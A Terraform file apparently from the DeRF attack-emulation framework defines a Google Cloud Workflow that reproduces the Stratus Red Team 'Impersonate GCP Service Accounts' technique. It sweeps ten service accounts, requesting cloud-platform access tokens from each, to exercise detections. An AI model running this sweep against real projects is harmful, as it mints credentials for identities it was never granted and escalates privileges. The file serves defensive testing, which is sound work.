data "google_service_account" "workflows-to-cloudrun-sa" {
  account_id   = "workflows-to-cloudrun-sa"

}


resource "google_workflows_workflow" "workflow_to_invoke_impersonate_sa" {
  name            = "gcp-impersonate-sa-srt"
  description     = "A workflow intended to match the functionality of the Status Red Team attack technique 'Impersonate GCP Service Accounts': https://stratus-red-team.cloud/attack-techniques/GCP/gcp.privilege-escalation.impersonate-service-accounts/"
  service_account = data.google_service_account.workflows-to-cloudrun-sa.id
  project         = var.projectId
  source_contents = <<-EOF

######################################################################################
## Attack Description
######################################################################################
## Attempts to simulate an attacker sweeping through a large number of customer-managed
## Service Accounts in a project and attempting to imersonate.
## Only one of the (10) SA's does the DeRF Attacker SA's have permissions.

#####################################################################################
## Input
######################################################################################
##### INPUT: {"sa":"01"}
##### INPUT: {"sa":"02"}


######################################################################################
## User Agent
######################################################################################
#### Excutes with User-Agent: "Derf-GCP-Impersonate-Service-Account-WORKFLOWEXECUTIONID"


######################################################################################
## Main Workflow Execution
######################################################################################
main:
  params: [args]
  steps:
    - assign:
        assign:
        - sa: $${args.sa}
        - projectID: $${sys.get_env("GOOGLE_CLOUD_PROJECT_ID")} 
    - ImpersonateDeRFAttackerServiceAccount:
        call: ImpersonateDeRFAttackerServiceAccount
        args:
            attackerSa: $${sa}
        result: AccessToken
    - ImpersonateTargetServiceAccounts:
        call: ImpersonateTargetServiceAccounts
        args:
            AccessToken: $${AccessToken}
        result: response
    - return:
        return: $${response}


######################################################################################
## Submodules | Sub-Workflows
######################################################################################
ImpersonateDeRFAttackerServiceAccount:
  params: [attackerSa]
  steps: 
    - buildURL:
        assign:
        - a: 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/derf-attacker-sa-'
        - b: '@'
        - c: ${var.gcp_derf_project_id}
        - d: '.iam.gserviceaccount.com:generateAccessToken'
        - e: '$${a+attackerSa+b+c+d}'   
    - ImpersonateTargetSA:
        call: http.post
        args:
          url: $${e}
          auth:
              type: OAuth2
          headers:
            Content-Type: application/json
            User-Agent: Derf-Impersonate-Attacker-SA-WORKFLOWEXECUTIONID
          body: 
            delegates: null
            scope: https://www.googleapis.com/auth/cloud-platform
            lifetime: 3600s
        result: response
    - return:
        return: $${response.body.accessToken}

ImpersonateTargetServiceAccounts:
  params: [AccessToken]
  steps:
    - ImpersonateTargetServiceAccount0:
        try:
          call: http.post
          args:
            url: https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${google_service_account.service_account[0].email}:generateAccessToken
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: Derf-GCP-Impersonate-Service-Account-WORKFLOWEXECUTIONID
            body: 
              delegates: null
              scope: https://www.googleapis.com/auth/cloud-platform
              lifetime: 3600s
          result: response
        except:
            as: e
            steps:
                - known_errors0:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      next: ImpersonateTargetServiceAccount1
                    - condition: $${e.code == 200}
                      next: ImpersonateTargetServiceAccount1
                - unhandled_exception0:
                    raise: $${e}

    - ImpersonateTargetServiceAccount1:
        try:
          call: http.post
          args:
            url: https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${google_service_account.service_account[1].email}:generateAccessToken
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: Derf-GCP-Impersonate-Service-Account-WORKFLOWEXECUTIONID
            body: 
              delegates: null
              scope: https://www.googleapis.com/auth/cloud-platform
              lifetime: 3600s
          result: response
        except:
            as: e
            steps:
                - known_errors1:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      next: ImpersonateTargetServiceAccount2
                    - condition: $${e.code == 200}
                      next: ImpersonateTargetServiceAccount2
                - unhandled_exception1:
                    raise: $${e}

    - ImpersonateTargetServiceAccount2:
        try:
          call: http.post
          args:
            url: https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${google_service_account.service_account[2].email}:generateAccessToken
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: Derf-GCP-Impersonate-Service-Account-WORKFLOWEXECUTIONID
            body: 
              delegates: null
              scope: https://www.googleapis.com/auth/cloud-platform
              lifetime: 3600s
          result: response
        except:
            as: e
            steps:
                - known_errors2:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      next: ImpersonateTargetServiceAccount3
                    - condition: $${e.code == 200}
                      next: ImpersonateTargetServiceAccount3
                - unhandled_exception2:
                    raise: $${e}

    - ImpersonateTargetServiceAccount3:
        try:
          call: http.post
          args:
            url: https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${google_service_account.service_account[3].email}:generateAccessToken
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: Derf-GCP-Impersonate-Service-Account-WORKFLOWEXECUTIONID
            body: 
              delegates: null
              scope: https://www.googleapis.com/auth/cloud-platform
              lifetime: 3600s
          result: response
        except:
            as: e
            steps:
                - known_errors3:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      next: ImpersonateTargetServiceAccount4
                    - condition: $${e.code == 200}
                      next: ImpersonateTargetServiceAccount4
                - unhandled_exception3:
                    raise: $${e}

    - ImpersonateTargetServiceAccount4:
        try:
          call: http.post
          args:
            url: https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${google_service_account.service_account[4].email}:generateAccessToken
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: Derf-GCP-Impersonate-Service-Account-WORKFLOWEXECUTIONID
            body: 
              delegates: null
              scope: https://www.googleapis.com/auth/cloud-platform
              lifetime: 3600s
          result: response
        except:
            as: e
            steps:
                - known_errors4:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      next: ImpersonateTargetServiceAccount5
                    - condition: $${e.code == 200}
                      next: ImpersonateTargetServiceAccount5
                - unhandled_exception4:
                    raise: $${e}

    - ImpersonateTargetServiceAccount5:
        try:
          call: http.post
          args:
            url: https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${google_service_account.service_account[5].email}:generateAccessToken
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: Derf-GCP-Impersonate-Service-Account-WORKFLOWEXECUTIONID
            body: 
              delegates: null
              scope: https://www.googleapis.com/auth/cloud-platform
              lifetime: 3600s
          result: response
        except:
            as: e
            steps:
                - known_errors5:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      next: ImpersonateTargetServiceAccount6
                    - condition: $${e.code == 200}
                      next: ImpersonateTargetServiceAccount6
                - unhandled_exception5:
                    raise: $${e}

    - ImpersonateTargetServiceAccount6:
        try:
          call: http.post
          args:
            url: https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${google_service_account.service_account[6].email}:generateAccessToken
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: Derf-GCP-Impersonate-Service-Account-WORKFLOWEXECUTIONID
            body: 
              delegates: null
              scope: https://www.googleapis.com/auth/cloud-platform
              lifetime: 3600s
          result: response
        except:
            as: e
            steps:
                - known_errors6:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      next: ImpersonateTargetServiceAccount7
                    - condition: $${e.code == 200}
                      next: ImpersonateTargetServiceAccount7
                - unhandled_exception6:
                    raise: $${e}

    - ImpersonateTargetServiceAccount7:
        try:
          call: http.post
          args:
            url: https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${google_service_account.service_account[7].email}:generateAccessToken
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: Derf-GCP-Impersonate-Service-Account-WORKFLOWEXECUTIONID
            body: 
              delegates: null
              scope: https://www.googleapis.com/auth/cloud-platform
              lifetime: 3600s
          result: response
        except:
            as: e
            steps:
                - known_errors7:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      next: ImpersonateTargetServiceAccount8
                    - condition: $${e.code == 200}
                      next: ImpersonateTargetServiceAccount8
                - unhandled_exception7:
                    raise: $${e}

    - ImpersonateTargetServiceAccount8:
        try:
          call: http.post
          args:
            url: https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${google_service_account.service_account[8].email}:generateAccessToken
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: Derf-GCP-Impersonate-Service-Account-WORKFLOWEXECUTIONID
            body: 
              delegates: null
              scope: https://www.googleapis.com/auth/cloud-platform
              lifetime: 3600s
          result: response
        except:
            as: e
            steps:
                - known_errors8:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      next: ImpersonateTargetServiceAccount9
                    - condition: $${e.code == 200}
                      next: ImpersonateTargetServiceAccount9
                - unhandled_exception8:
                    raise: $${e}

    - ImpersonateTargetServiceAccount9:
        try:
          call: http.post
          args:
            url: https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${google_service_account.service_account[9].email}:generateAccessToken
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: Derf-GCP-Impersonate-Service-Account-WORKFLOWEXECUTIONID
            body: 
              delegates: null
              scope: https://www.googleapis.com/auth/cloud-platform
              lifetime: 3600s
          result: response
        except:
            as: e
            steps:
                - known_errors9:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      next: ImpersonateTargetServiceAccount9
                    - condition: $${e.code == 200}
                      next: return
                - unhandled_exception9:
                    raise: $${e}
        
    - return:
        return: 
            - $${response.code}
            - "SUCCESS | GCP Impersonate Service Account Attack"


  EOF

}
